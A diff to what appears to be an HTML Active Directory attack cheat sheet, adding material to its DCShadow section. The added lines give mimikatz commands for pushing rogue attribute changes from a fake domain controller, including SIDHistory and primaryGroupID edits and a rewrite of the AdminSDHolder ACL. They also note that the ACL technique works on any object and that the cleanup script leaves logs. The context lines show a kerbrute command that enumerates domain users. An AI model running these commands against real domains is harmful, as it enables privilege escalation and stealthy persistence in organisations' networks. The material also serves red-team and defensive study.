@@ -1382,9 +1382,29 @@ lsadump::sam
 <p>Start a RPC server with SYSTEM privileges and setup changes to a object with <code>mimikatz</code>:</p>
 <div class="highlight"><pre><span></span><code>!+
 !processtoken
+
+<span class="c1"># Single change</span>
 lsadump::dcshadow<span class="w"> </span>/object:&lt;object<span class="w"> </span>distinguished<span class="w"> </span>name&gt;<span class="w"> </span>/attribute:&lt;attribute<span class="w"> </span>name&gt;<span class="w"> </span>/value<span class="o">=</span>&lt;attribute<span class="w"> </span>value&gt;
+
+<span class="c1"># Multiple changes need the /stack option</span>
+lsadump::dcshadow<span class="w"> </span>/stack<span class="w"> </span>/object:&lt;object<span class="w"> </span><span class="m">1</span><span class="w"> </span>distinguished<span class="w"> </span>name&gt;<span class="w"> </span>/attribute:&lt;attribute<span class="w"> </span>name&gt;<span class="w"> </span>/value<span class="o">=</span>&lt;attribute<span class="w"> </span>value&gt;
+...
+lsadump::dcshadow<span class="w"> </span>/stack<span class="w"> </span>/object:&lt;object<span class="w"> </span>N<span class="w"> </span>distinguished<span class="w"> </span>name&gt;<span class="w"> </span>/attribute:&lt;attribute<span class="w"> </span>name&gt;<span class="w"> </span>/value<span class="o">=</span>&lt;attribute<span class="w"> </span>value&gt;
+
+lsadump::dcshadow
 </code></pre></div>
 <p>Note: Changed attribute are generally <code>SIDHistory</code> or <code>primaryGroupID</code>, used to elevate a user privileges.</p>
+<p>Edit the AdminSDHolder object:</p>
+<div class="highlight"><pre><span></span><code><span class="c"># Get current ACEs for the AdminSDHolder object</span>
+<span class="p">(</span><span class="nb">New-Object</span>
+<span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span><span class="p">(</span><span class="s2">"&lt;CN=AdminSDHolder,CN=System,DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;"</span><span class="p">)).</span><span class="n">psbase</span><span class="p">.</span><span class="n">ObjectSecurity</span><span class="p">.</span><span class="n">sddl</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>!+
+!processtoken
+lsadump::dcshadow
+/object:<span class="s1">'&lt;CN=AdminSDHolder,CN=System,DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;'</span><span class="w"> </span>/attribute:ntSecurityDescriptor<span class="w"> </span>/value:&lt;modified<span class="w"> </span>ACL&gt;
+</code></pre></div>
+<p>Note: <strong>previous command can be used to edit ACLs for any object!</strong></p>
 <p>Push changes through AD; run the following command with enough privileges (Domain admin or otherwise):</p>
 <div class="highlight"><pre><span></span><code>privilege::debug
 lsadump::dcshadow<span class="w"> </span>/push
@@ -1395,6 +1415,7 @@ lsadump::dcshadow<span class="w"> </span>/push
 <p>Cleanup permissions:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Set-DCShadowPermissions</span> <span class="n">-FakeDC</span> <span class="p">&lt;</span><span class="n">computer</span> <span class="n">from</span> <span class="n">which</span> <span class="n">running</span> <span class="n">DCShadow</span><span class="p">&gt;</span> <span class="n">-Object</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">object</span> <span class="n">name</span><span class="p">&gt;</span> <span class="n">-Username</span> <span class="p">&lt;</span><span class="n">user</span> <span class="n">getting</span> <span class="n">privileges</span><span class="p">&gt;</span> <span class="n">-Verbose</span> <span class="n">-Remove</span>
 </code></pre></div>
+<p>Note: <strong>this script DOES generate logs!</strong> </p>
 <h2 id="kerberos-commons_1">Kerberos Commons</h2>
 <p>Brute-force user accounts from a domain controller using a supplied wordlist:</p>
 <div class="highlight"><pre><span></span><code><span class="n">kerbrute</span><span class="w"> </span><span class="n">userenum</span><span class="w"> </span><span class="o">--</span><span class="n">dc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">domain</span><span class="w"> </span><span class="n">controller</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="o">&lt;</span><span class="n">domain</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">wordlist</span><span class="o">&gt;</span>
